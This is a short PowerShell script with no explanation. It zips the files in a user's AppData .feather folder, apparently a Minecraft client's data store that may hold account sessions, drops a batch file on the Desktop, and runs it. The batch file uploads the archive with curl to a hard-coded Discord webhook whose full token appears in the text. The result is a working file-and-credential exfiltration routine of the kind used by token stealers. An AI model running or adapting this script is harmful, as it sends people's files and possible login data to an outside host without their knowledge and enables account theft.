# Define paths
$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$batchFilePath = Join-Path $desktopPath 'send_feather_webhook.bat'
$featherFolder = 'C:\Users\haboom\AppData\Roaming\.feather'
$zipPath = Join-Path $env:TEMP 'feather_files.zip'
$webhookUrl = 'https://discord.com/api/webhooks/1385974639590637598/I-qq5IcfJUmAbaLuA1T7hK7UM-HaQBou94NVNO7EAzuI6y1coIjL6-lm7a92wyN608Ui'

# Make sure the .feather folder exists
if (-not (Test-Path $featherFolder)) {
    Write-Host "❌ Folder not found: $featherFolder"
    exit
}

# Get all files (no subfolders)
$files = Get-ChildItem -Path $featherFolder -File

# Exit if no files found
if ($files.Count -eq 0) {
    Write-Host "❌ No files found in .feather folder."
    exit
}

# Remove old zip if it exists
if (Test-Path $zipPath) { Remove-Item $zipPath -Force }

# Zip only the files into a flat archive
Compress-Archive -Path $files.FullName -DestinationPath $zipPath

# Create the batch file content
$batchContent = @"
@echo off
setlocal

:: Discord Webhook URL
set webhookUrl=$webhookUrl

:: Path to the ZIP file
set zipPath=$zipPath

:: JSON message
set payload_json={{\"content\":\"📁 Feather files zipped and sent.\"}}

:: Send via curl
curl -X POST %webhookUrl% ^
     -H "Content-Type: multipart/form-data" ^
     -F "payload_json=%payload_json%" ^
     -F "file=@%zipPath%"

if %errorlevel% neq 0 (
    echo ❌ Failed to send ZIP.
) else (
    echo ✅ ZIP sent successfully!
)

endlocal
"@

# Write batch file to Desktop
Set-Content -Path $batchFilePath -Value $batchContent

# Run the batch file
Start-Process -FilePath $batchFilePath
Write-Host "🚀 Sending zipped files to Discord..."
